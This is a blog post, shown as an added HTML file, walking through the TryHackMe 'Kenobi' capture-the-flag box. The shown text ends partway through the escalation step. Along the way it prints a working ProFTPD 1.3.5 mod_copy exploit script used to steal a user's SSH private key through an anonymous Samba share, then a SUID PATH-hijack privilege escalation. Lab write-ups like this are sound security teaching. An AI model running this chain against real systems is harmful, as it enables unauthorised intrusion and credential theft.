@@ -1,0 +1,200 @@
+<!doctype html><html lang=en-us><head><title>Kenobi Boot2Root Write-Up | Nate Catelli's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="A boot2root writeup of the Kenobi host from TryHackMe."><meta name=generator content="Hugo 0.101.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon></head><body><nav class=navigation><a href=/><span class=arrow>←</span>Home</a>
+<a href=/posts>Archive</a>
+<a href=/tags>Tags</a>
+<a href=/about>About</a>
+<a href=/projects>Projects</a>
+<a class=button href=https://ncatelli.github.io/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>Kenobi Boot2Root Write-Up</h1><div class=tip><time datetime="2020-11-14 00:00:00 +0000 UTC">Nov 14, 2020</time>
+<span class=split>·</span>
+<span>1568 words</span>
+<span class=split>·</span>
+<span>8 minute read</span></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#environment>Environment</a></li><li><a href=#attacking-kenobi>Attacking Kenobi</a><ul><li><a href=#host-enumeration>Host Enumeration</a></li><li><a href=#preparing-an-attack>Preparing an attack</a></li></ul></li><li><a href=#summary>Summary</a></li></ul></nav></div></details></aside><div class=content><h2 id=introduction>Introduction <a href=#introduction class=anchor>🔗</a></h2><p>The Kenobi boot2root challenge was a ton of fun because it required multiple pivots to learn enough to leak a key. On my first pass, I overlooked the NFS server which really impressed the importance of carefully reviewing scans.</p><h2 id=environment>Environment <a href=#environment class=anchor>🔗</a></h2><p>The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the the target host which I knew contained 2 flags to capture. Nothing else was known about the host prior to the attack other than that the host was most likely a Linux server.</p><h2 id=attacking-kenobi>Attacking Kenobi <a href=#attacking-kenobi class=anchor>🔗</a></h2><p>Since I knew I would be attacking a single target, I exported the host&rsquo;s IP to the environment variable <code>ATTACKTARGET</code>. I&rsquo;ve also modified a few scans for the single host case by doing things such as disabling pings.</p><h3 id=host-enumeration>Host Enumeration <a href=#host-enumeration class=anchor>🔗</a></h3><p>I began the attack by opening up a new tmux session and starting a few nmap scans to get a feel for the lay of the land. I started with a SYN, OS and Service Version scan.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# mkdir scans
+</span></span><span style=display:flex><span>root@kali:~# cd scans/
+</span></span><span style=display:flex><span>root@kali:~/scans# nmap -sS -sV -O -Pn -oA $ATTACKTARGET $ATTACKTARGET 
+</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-14 22:18 UTC
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-221-157.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.221.157<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00043s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>993</span> closed ports
+</span></span><span style=display:flex><span>PORT     STATE SERVICE     VERSION
+</span></span><span style=display:flex><span>21/tcp   open  ftp         ProFTPD 1.3.5
+</span></span><span style=display:flex><span>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>80/tcp   open  http        Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>111/tcp  open  rpcbind     2-4 <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100000)</span>
+</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>2049/tcp open  nfs_acl     2-3 <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100227)</span>
+</span></span><span style=display:flex><span>MAC Address: 02:98:C4:09:75:23 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>TCP/IP fingerprint:
+</span></span><span style=display:flex><span>OS:SCAN<span style=color:#f92672>(</span>V<span style=color:#f92672>=</span>7.80%E<span style=color:#f92672>=</span>4%D<span style=color:#f92672>=</span>11/14%OT<span style=color:#f92672>=</span>21%CT<span style=color:#f92672>=</span>1%CU<span style=color:#f92672>=</span>41956%PV<span style=color:#f92672>=</span>Y%DS<span style=color:#f92672>=</span>1%DC<span style=color:#f92672>=</span>D%G<span style=color:#f92672>=</span>Y%M<span style=color:#f92672>=</span>0298C4%
+</span></span><span style=display:flex><span>OS:TM<span style=color:#f92672>=</span>5FB057C7%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu<span style=color:#f92672>)</span>SEQ<span style=color:#f92672>(</span>SP<span style=color:#f92672>=</span>106%GCD<span style=color:#f92672>=</span>1%ISR<span style=color:#f92672>=</span>106%TI<span style=color:#f92672>=</span>Z%CI<span style=color:#f92672>=</span>I%II<span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span>OS:I%TS<span style=color:#f92672>=</span>8<span style=color:#f92672>)</span>OPS<span style=color:#f92672>(</span>O1<span style=color:#f92672>=</span>M2301ST11NW7%O2<span style=color:#f92672>=</span>M2301ST11NW7%O3<span style=color:#f92672>=</span>M2301NNT11NW7%O4<span style=color:#f92672>=</span>M2301ST11
+</span></span><span style=display:flex><span>OS:NW7%O5<span style=color:#f92672>=</span>M2301ST11NW7%O6<span style=color:#f92672>=</span>M2301ST11<span style=color:#f92672>)</span>WIN<span style=color:#f92672>(</span>W1<span style=color:#f92672>=</span>68DF%W2<span style=color:#f92672>=</span>68DF%W3<span style=color:#f92672>=</span>68DF%W4<span style=color:#f92672>=</span>68DF%W5<span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span>OS:68DF%W6<span style=color:#f92672>=</span>68DF<span style=color:#f92672>)</span>ECN<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>6903%O<span style=color:#f92672>=</span>M2301NNSNW7%CC<span style=color:#f92672>=</span>Y%Q<span style=color:#f92672>=)</span>T1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%
+</span></span><span style=display:flex><span>OS:T<span style=color:#f92672>=</span>40%S<span style=color:#f92672>=</span>O%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AS%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T2<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T3<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T4<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span>OS:R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T5<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T6<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T
+</span></span><span style=display:flex><span>OS:<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T7<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span>OS:0%Q<span style=color:#f92672>=)</span>U1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%IPL<span style=color:#f92672>=</span>164%UN<span style=color:#f92672>=</span>0%RIPL<span style=color:#f92672>=</span>G%RID<span style=color:#f92672>=</span>G%RIPCK<span style=color:#f92672>=</span>G%RUCK<span style=color:#f92672>=</span>G%RUD<span style=color:#f92672>=</span>G<span style=color:#f92672>)</span>IE<span style=color:#f92672>(</span>
+</span></span><span style=display:flex><span>OS:R<span style=color:#f92672>=</span>Y%DFI<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%CD<span style=color:#f92672>=</span>S<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>1</span> hop
+</span></span><span style=display:flex><span>Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 25.27 second
+</span></span></code></pre></div><p>This scan uncovered a great deal of information about the host. It appeared to be an Ubuntu linux distro, running sambda, proftpd, and a webserver, each of which represented a viable path for investigation. I started by opening firefox to see what the website it was serving looked like.</p><p><p class=markdown-image><img src=/img/kenobi_http_index.png alt="Kenobi site index"></p></p><p>I tried a few different URLs for fun and ended up getting lucky with <code>robots.txt</code> which pointed out that there was a static <code>admin.html</code> page.</p><p><p class=markdown-image><img src=/img/kenobi_http_admin.png alt="Kenobi site admin"></p></p><p>Given that there were a few other targets, I decided to look into those before enumerating the webserver further. Samba seemed like a reasonable next choice and I began by enumerating both shares and users using two of the smb scripts provided with nmap.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/scans# nmap --script<span style=color:#f92672>=</span>smb-enum-shares.nse,smb-enum-users.nse -p <span style=color:#ae81ff>445</span> -oA smb $ATTACKTARGET 
+</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-14 22:22 UTC
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-221-157.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.221.157<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00018s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT    STATE SERVICE
+</span></span><span style=display:flex><span>445/tcp open  microsoft-ds
+</span></span><span style=display:flex><span>MAC Address: 02:98:C4:09:75:23 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host script results:
+</span></span><span style=display:flex><span>| smb-enum-shares: 
+</span></span><span style=display:flex><span>|   account_used: guest
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>\\</span>10.10.221.157<span style=color:#ae81ff>\I</span>PC$: 
+</span></span><span style=display:flex><span>|     Type: STYPE_IPC_HIDDEN
+</span></span><span style=display:flex><span>|     Comment: IPC Service <span style=color:#f92672>(</span>kenobi server <span style=color:#f92672>(</span>Samba, Ubuntu<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>|     Users: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>|     Max Users: &lt;unlimited&gt;
+</span></span><span style=display:flex><span>|     Path: C:<span style=color:#ae81ff>\t</span>mp
+</span></span><span style=display:flex><span>|     Anonymous access: READ/WRITE
+</span></span><span style=display:flex><span>|     Current user access: READ/WRITE
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>\\</span>10.10.221.157<span style=color:#ae81ff>\a</span>nonymous: 
+</span></span><span style=display:flex><span>|     Type: STYPE_DISKTREE
+</span></span><span style=display:flex><span>|     Comment: 
+</span></span><span style=display:flex><span>|     Users: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>|     Max Users: &lt;unlimited&gt;
+</span></span><span style=display:flex><span>|     Path: C:<span style=color:#ae81ff>\h</span>ome<span style=color:#ae81ff>\k</span>enobi<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>|     Anonymous access: READ/WRITE
+</span></span><span style=display:flex><span>|     Current user access: READ/WRITE
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>\\</span>10.10.221.157<span style=color:#ae81ff>\p</span>rint$: 
+</span></span><span style=display:flex><span>|     Type: STYPE_DISKTREE
+</span></span><span style=display:flex><span>|     Comment: Printer Drivers
+</span></span><span style=display:flex><span>|     Users: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>|     Max Users: &lt;unlimited&gt;
+</span></span><span style=display:flex><span>|     Path: C:<span style=color:#ae81ff>\v</span>ar<span style=color:#ae81ff>\l</span>ib<span style=color:#ae81ff>\s</span>amba<span style=color:#ae81ff>\p</span>rinters
+</span></span><span style=display:flex><span>|     Anonymous access: &lt;none&gt;
+</span></span><span style=display:flex><span>|_    Current user access: &lt;none&gt;
+</span></span><span style=display:flex><span>|_smb-enum-users: ERROR: Script execution failed <span style=color:#f92672>(</span>use -d to debug<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 0.58 second
+</span></span></code></pre></div><p>This scan exposed a potential <code>kenobi</code> user and also identified an anonymous share. I connected to that share and was lucky to find a <code>logs.txt</code> file that turned out to be a gold mine, exposing the <code>kenobi</code> user and a path to an SSH key. This also contained a possibly up-to-date copy of the samba config file that pointed to where the users home directory and the samba share were.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span> get log.txt 
+</span></span><span style=display:flex><span>getting file <span style=color:#ae81ff>\l</span>og.txt of size <span style=color:#ae81ff>12237</span> as log.txt <span style=color:#f92672>(</span>1991.7 KiloBytes/sec<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>average 1991.7 KiloBytes/sec<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>root@kali:~# cat log.txt | head -n <span style=color:#ae81ff>7</span>
+</span></span><span style=display:flex><span>Generating public/private rsa key pair.
+</span></span><span style=display:flex><span>Enter file in which to save the key <span style=color:#f92672>(</span>/home/kenobi/.ssh/id_rsa<span style=color:#f92672>)</span>: 
+</span></span><span style=display:flex><span>Created directory <span style=color:#e6db74>&#39;/home/kenobi/.ssh&#39;</span>.
+</span></span><span style=display:flex><span>Enter passphrase <span style=color:#f92672>(</span>empty <span style=color:#66d9ef>for</span> no passphrase<span style=color:#f92672>)</span>: 
+</span></span><span style=display:flex><span>Enter same passphrase again: 
+</span></span><span style=display:flex><span>Your identification has been saved in /home/kenobi/.ssh/id_rsa.
+</span></span><span style=display:flex><span>Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root@kali:~# cat log.txt | grep <span style=color:#e6db74>&#39;\[anonymous\]&#39;</span> -A5
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>anonymous<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>   path <span style=color:#f92672>=</span> /home/kenobi/share
+</span></span><span style=display:flex><span>   browseable <span style=color:#f92672>=</span> yes
+</span></span><span style=display:flex><span>   read only <span style=color:#f92672>=</span> yes
+</span></span><span style=display:flex><span>   guest ok <span style=color:#f92672>=</span> yes
+</span></span></code></pre></div><p>Finally, I decided to probe around on the FTP server, which didn&rsquo;t appear to have anonymous logins. With a few services, a bit of a map of the environment and some service versions in hand, I ran a few search queries through <code>searchsploit</code> before landing on the following exploits for <code>ProFTPd 1.3.5</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# searchsploit 1.3.5 -w | grep -i proftpd 
+</span></span><span style=display:flex><span>ProFTPd 1.3.5 - <span style=color:#e6db74>&#39;mod_copy&#39;</span> Command Execution <span style=color:#f92672>(</span>Metasploit<span style=color:#f92672>)</span> | https://www.exploit-db.com/exploits/37262
+</span></span><span style=display:flex><span>ProFTPd 1.3.5 - <span style=color:#e6db74>&#39;mod_copy&#39;</span> Remote Command Execution       | https://www.exploit-db.com/exploits/36803
+</span></span><span style=display:flex><span>ProFTPd 1.3.5 - File Copy                                 | https://www.exploit-db.com/exploits/36742
+</span></span><span style=display:flex><span>root@kali:~# mkdir exploit <span style=color:#f92672>&amp;&amp;</span> cd exploit/
+</span></span></code></pre></div><h3 id=preparing-an-attack>Preparing an attack <a href=#preparing-an-attack class=anchor>🔗</a></h3><p>These exploits allowed me to arbitrarily copy files around on the filesystem. Since I had a key and a few points of exfiltration, it seemed worth attempting. The second option in the list, exploit <code>36803</code>, included a python script that I modified to accept a source and destination argument. I then used the exploit to move the <code>kenobi</code> user&rsquo;s ssh key into the samba share. I&rsquo;ve included the modified script below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> socket
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>4</span>):
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74> Usage : exploit.py server directory cmd&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>    server <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>] <span style=color:#75715e># vulnerable server</span>
+</span></span><span style=display:flex><span>    src <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>] <span style=color:#75715e># source file to move</span>
+</span></span><span style=display:flex><span>    dest <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>3</span>] <span style=color:#75715e># new destination of source file</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM) <span style=color:#66d9ef>as</span> s:
+</span></span><span style=display:flex><span>        s<span style=color:#f92672>.</span>connect((server, <span style=color:#ae81ff>21</span>))
+</span></span><span style=display:flex><span>        s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#39;[ + ] Connected to server [ + ]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>        s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;site cpfr </span><span style=color:#e6db74>{</span>src<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>        s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+</span></span><span style=display:flex><span>        s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;site cpto </span><span style=color:#e6db74>{</span>dest<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>        s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/exploit# python3 exploit.py $ATTACKTARGET <span style=color:#e6db74>&#39;/home/kenobi/.ssh/id_rsa&#39;</span> <span style=color:#e6db74>&#39;/home/kenobi/share/id_rsa&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span> + <span style=color:#f92672>]</span> Connected to server <span style=color:#f92672>[</span> + <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root@kali:~# smbclient //$ATTACKTARGET/anonymous
+</span></span><span style=display:flex><span>Enter WORKGROUP<span style=color:#ae81ff>\r</span>oot<span style=color:#e6db74>&#39;s password: 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Try &#34;help&#34; to get a list of possible commands.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>smb: \&gt; ls
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  .                                   D        0  Sun Nov 15 00:53:15 2020
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  ..                                  D        0  Wed Sep  4 10:56:07 2019
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  id_rsa                              N     1675  Sun Nov 15 00:53:15 2020
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  log.txt                             N    12237  Wed Sep  4 10:49:09 2019
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  9204224 blocks of size 1024. 6877112 blocks available
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>smb: \&gt; get id_rsa 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>getting file \id_rsa of size 1675 as id_rsa (817.8 KiloBytes/sec) (average 817.9 KiloBytes/sec)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>smb: \&gt; 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>root@kali:~# mv id_rsa ~/.ssh/kenobi &amp;&amp; chmod 600 ~/.ssh/kenobi
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>root@kali:~# ssh kenobi@$ATTACKTARGET -i ~/.ssh/kenobi 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>load pubkey &#34;/root/.ssh/kenobi&#34;: invalid format
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>The authenticity of host &#39;</span>10.10.221.157 <span style=color:#f92672>(</span>10.10.221.157<span style=color:#f92672>)</span><span style=color:#e6db74>&#39; can&#39;</span>t be established.
+</span></span><span style=display:flex><span>ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
+</span></span><span style=display:flex><span>Are you sure you want to <span style=color:#66d9ef>continue</span> connecting <span style=color:#f92672>(</span>yes/no/<span style=color:#f92672>[</span>fingerprint<span style=color:#f92672>])</span>? yes
+</span></span><span style=display:flex><span>Warning: Permanently added <span style=color:#e6db74>&#39;10.10.221.157&#39;</span> <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span> to the list of known hosts.
+</span></span><span style=display:flex><span>Welcome to Ubuntu 16.04.6 LTS <span style=color:#f92672>(</span>GNU/Linux 4.8.0-58-generic x86_64<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>103</span> packages can be updated.
+</span></span><span style=display:flex><span><span style=color:#ae81ff>65</span> updates are security updates.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Wed Sep  <span style=color:#ae81ff>4</span> 07:10:15 <span style=color:#ae81ff>2019</span> from 192.168.1.147
+</span></span><span style=display:flex><span>To run a command as administrator <span style=color:#f92672>(</span>user <span style=color:#e6db74>&#34;root&#34;</span><span style=color:#f92672>)</span>, use <span style=color:#e6db74>&#34;sudo &lt;command&gt;&#34;</span>.
+</span></span><span style=display:flex><span>See <span style=color:#e6db74>&#34;man sudo_root&#34;</span> <span style=color:#66d9ef>for</span> details.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>kenobi@kenobi:~$
+</span></span></code></pre></div><p>Success! I had a local account on the host!</p><h4 id=escalating-privileges>Escalating privileges <a href=#escalating-privileges class=anchor>🔗</a></h4><p>I began to poke around on the host and managed to find a flag <code>user.txt</code> sitting in kenobi&rsquo;s home directory. I followed my usual CTF local enumerating steps, which included checking the host version, sudo privs, etc&mldr; when I&rsquo;d noticed a binary I wasn&rsquo;t familiar with when checking for files with the SUID bits set. I&rsquo;ve truncated the output a bit for clarity.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>kenobi@kenobi:~$ find / -perm -4000 -type f 2&gt;/dev/null
+</span></span><span style=display:flex><span>/sbin/mount.nfs
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>/usr/bin/menu
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>/bin/ping6
+</span></span></code></pre></div><p>Running this <code>menu</code> command prompted for an option and then output a corresponding status check of the site, network configuration information or the kernel version. I then fed the command through strings to validate that it was shelling out and was pleased to find that it called out to both <code>curl</code> and <code>uname</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>kenobi@kenobi:~$ /usr/bin/menu
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>***************************************
+</span></span><span style=display:flex><span>1. status check
+</span></span><span style=display:flex><span>2. kernel version
+</span></span><span style=display:flex><span>3. ifconfig
+</span></span><span style=display:flex><span>** Enter your choice :2
+</span></span><span style=display:flex><span>4.8.0-58-generic
+</span></span><span style=display:flex><span>kenobi@kenobi:~$ strings /usr/bin/menu | egrep <span style=color:#e6db74>&#39;curl|uname|ifconifg&#39;</span>
+</span></span><span style=display:flex><span>curl -I localhost
+</span></span><span style=display:flex><span>uname -r
+</span></span></code></pre></div><p>With this information I decided to try a PATH hijacking attack by creating an executable binary in the kenobi user&rsquo;s local path which, when ran, would invoke <code>/bin/bash</code>. I then overrode the kenobi user&rsquo;s PATH to place its local <code>~/bin/</code> directory at the highest priority and attempted to rerun the kernel version <code>menu</code> command again.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>kenobi@kenobi:~$ mkdir bin
+</span></span><span style=display:flex><span>kenobi@kenobi:~$ echo <span style=color:#e6db74>&#39;/bin/bash&#39;</span> &gt; bin/uname
+</span></span><span style=display:flex><span>kenobi@kenobi:~$ chmod +x bin/uname 
+</span></span><span style=display:flex><span>kenobi@kenobi:~$ export PATH<span style=color:#f92672>=</span>~/bin/:$PATH
+</span></span><span style=display:flex><span>kenobi@kenobi:~$ /usr/bin/menu
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>***************************************
+</span></span><span style=display:flex><span>1. status check
+</span></span><span style=display:flex><span>2. kernel version
+</span></span><span style=display:flex><span>3. ifconfig
+</span></span><span style=display:flex><span>** Enter your choice :2
+</span></span><span style=display:flex><span>To run a command as administrator <span style=color:#f92672>(</span>user <span style=color:#e6db74>&#34;root&#34;</span><span style=color:#f92672>)</span>, use <span style=color:#e6db74>&#34;sudo &lt;command&gt;&#34;</span>.
